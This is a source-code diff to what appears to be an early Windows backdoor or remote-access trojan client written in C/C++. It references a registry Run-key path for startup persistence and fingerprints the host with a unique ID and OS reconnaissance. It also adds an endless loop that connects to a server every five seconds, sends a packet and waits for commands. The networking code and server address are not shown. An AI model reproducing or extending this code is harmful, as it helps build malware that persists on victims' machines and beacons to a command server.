@@ -11,12 +11,16 @@
 #include <stdio.h>
 #include <stdlib.h>
 
+#include <intrin.h>
+
 #pragma comment (lib, "Ws2_32.lib")
 #pragma comment (lib, "Mswsock.lib")
 #pragma comment (lib, "AdvApi32.lib")
 
+unsigned int G_UID;
+
 #include "net.h"
-#include "osinfo.h"
+#include "fingerprint.h"
 #include "fs.h"
 
 #define HKEY_PATH "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
@@ -30,9 +34,11 @@ void addToBoot(TCHAR *szPath) {
 }
 
 int main() {
-  OSVERSIONINFOEX info = getOSInfo();
+  G_UID = fingerprint::getUID();
+
+  OSVERSIONINFOEX info = fingerprint::getOSInfo();
   TCHAR ID[64];
-  reconOS(ID, &info);
+  fingerprint::reconOS(ID, &info);
 
   TCHAR exePath[MAX_PATH];
   GetModuleFileName(NULL, exePath, MAX_PATH);
@@ -40,7 +46,7 @@ int main() {
 
   printf("Running in: %s\n", exePath);
   printf(" Bits: %d\n Major: %d\n Minor: %d\n Build: %d\n Platform: %d\n UID: %s\n ID: %s\n",
-      is64bits() ? 64 : 32,
+      fingerprint::is64bits() ? 64 : 32,
       info.dwMajorVersion,
       info.dwMinorVersion,
       info.dwBuildNumber,
@@ -48,15 +54,30 @@ int main() {
       "",
       ID);
 
-  struct fs::s_folder folder;
-  fs::ls(&folder, (char *)"C:\\");
-  fs::print(&folder);
+
+
+  BOOL run = TRUE;
+  char buf[BUFFER_LENGTH];
+  int buffc;
 
   SOCKET sock;
-  net::createSocket(&sock);
-  net::connect(&sock);
-  net::write(&sock, (char*)"testing");
+  while (run) {
+    if (net::createSocket(&sock) == 0 && net::connect(&sock) == 0) {
+      net::PACKET * pck = net::newPacket((char*)"testing la vida locah!");
+      net::write(&sock, pck);
+      free(pck);
+
+      net::listen(&sock, buf, &buffc);
+    }
+    Sleep(5000);
+  }
+
   net::close(&sock);
+
+
+  // fingerprint::test();
+  // fs::test();
+  // net::test();
 
   return 0;
 }
